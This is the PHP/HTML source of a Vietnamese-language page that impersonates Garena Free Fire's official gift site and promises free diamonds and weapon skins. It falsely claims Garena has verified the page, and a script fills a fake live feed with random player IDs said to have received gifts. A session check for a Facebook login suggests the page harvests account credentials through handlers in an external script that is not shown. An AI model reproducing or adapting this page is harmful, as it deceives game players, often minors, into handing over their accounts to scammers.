<?php
session_start();
$time = time();
?>
<!doctype html>
<html lang="vi">
<head>
<title>
   Tri ân Free Fire - Tặng Quà Free Fire Miễn Phí Mới Nhất 2021
</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta property="fb:app_id" content="1311615385841456" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet" />
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.0.0/mdb.min.css" rel="stylesheet" />
<link href="../assets/huystarsystem.css?<?=$time;?>" rel="stylesheet" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Tri ân Free Fire - Tặng Quà Free Fire Miễn Phí Mới Nhất 2021" />
<meta property="og:description" content="Tri ân Free Fire - Tặng Quà Free Fire Miễn Phí Mới Nhất 2021" />
<meta property="og:image" content="../assets/img/118594380_736793720369972_8612394719123697639_o.jpg" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10" type="text/javascript"></script>
</head>
<body>
<div class="container">
<div class="row mt-3">
<div class="col-md-12 mb-4">
<section id="section-introduction">

<h2 class="h1 fw-bold">Garena Free Fire</h2>
<h1 class="h6">Trang đổi quà chính thức của Garena Free Fire!</h1>
<p class="my-4">Trang đã được <b>Garena Free Fire</b> xác nhận là chính chủ và được phép khởi chạy. Mọi thông tin bạn cung cấp đều được bảo mật tuyệt đối!<br /></p>
</section>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/57079679_2413227698701807_5297390513740054528_o-removebg-preview.png" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">10.000 kim cương</h5><p class="card-text">Nhận trong 5 phút</p></div></div>
<center>
<button type="button" id="qua1" onclick="nhanqua(1)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/134708007_829842567731753_3471716140197814510_o (1).jpg" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">Scar Cá Mập Đen</h5><p class="card-text"><span class="badge bg-success">(++) Tốc độ bắn</span><br /><span class="badge bg-success">(+) Sát thương</span><br /><span class="badge bg-danger">(-) Tốc độ thay đạn</span></p></div></div>
<center>
<button type="button" id="qua2" onclick="nhanqua(2)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/118594380_736793720369972_8612394719123697639_o.jpg" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">MP40 tứ quý</h5><p class="card-text"><span class="badge bg-success">(++) Sát thương</span><br /><span class="badge bg-success">(+) Tốc độ bắn</span><br /><span class="badge bg-danger">(-) Tầm xa</span></p></div></div>
<center>
<button type="button" id="qua3" onclick="nhanqua(3)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/130282598_814087092640634_3231164290930313537_o.jpg" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">Scar siêu phẩm</h5><p class="card-text"><span class="badge bg-success">(++) Tốc độ bắn</span><br /><span class="badge bg-success">(+) Sát thương</span><br /><span class="badge bg-danger">(-) Băng đạn</span></p></div></div>
<center>
<button type="button" id="qua4" onclick="nhanqua(4)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
</div>
<div class="row mt-4">
<div class="col-md-6 mb-4"><p class="h5">Lịch sử nhận quà</p>
<p class="h6">Thống kê theo thời gian thực</p>
<ul class="list-group mt-3">
<div id="thongke"></div>
</ul>
<script type="text/javascript">
ketqua();
setInterval(ketqua, 500);
function ketqua(){
    var ketqua = '';
    for(i = 1; i <= 5; i++){
        var nguoidung = Math.floor(Math.random() * 100000000000);
        $("#thongke").html(ketqua += '<li class="list-group-item">ID <b>'+nguoidung+'</b> vừa nhận quà thành công!</li>');
    }
}
</script>
</div>
<div class="col-md-6 mb-4">
<div class="vhncardquayso"><img src="../assets/img/113_st_patricks_db (1).gif"></div>
<div class="kimcuong khong phanqua1"><b>9.999</b> <img src="../assets/img/kc.png"><small class="dacbiet">Đặc biệt</small></div>
<div class="kimcuong khong phanqua2"><b>45</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua3"><b>200</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua4"><b>2.375</b> <img src="../assets/img/kc.png"><small class="dacbiet">Đặc biệt</small></div>
<div class="kimcuong khong phanqua5"><b>950</b> <img src="../assets/img/kc.png"><small class="dacbiet">Dễ trúng</small></div>
<div class="kimcuong khong phanqua6"><b>90</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua7"><b>135</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua8"><b>9.999</b> <img src="../assets/img/kc.png"><small class="dacbiet">Đặc biệt</small></div>
<div class="kimcuongz">
<div id="quayso_vohuunhan" class="quayso">
<b>Quay số</b>
</div>
</div>
</div>
<div class="col-md-12 mt-4 mb-4 footervhn">
<?php if(isset($_SESSION['facebook'])){ ?>
<a href="dangxuat.php"><button type="button" class="btn btn-primary">Đăng xuất</button>
</a>
<?php } ?>
<br /><br />
<b>Được điều hành bởi:</b> <img src="../assets/img/logo@2x.c05a558a.png" />
</div>
</div>
</div>
<script type="text/javascript" src="../assets/huystar.js?<?=$time;?>"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.0.0/mdb.min.js"></script>
<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="49" defer=""></script></body>
</html>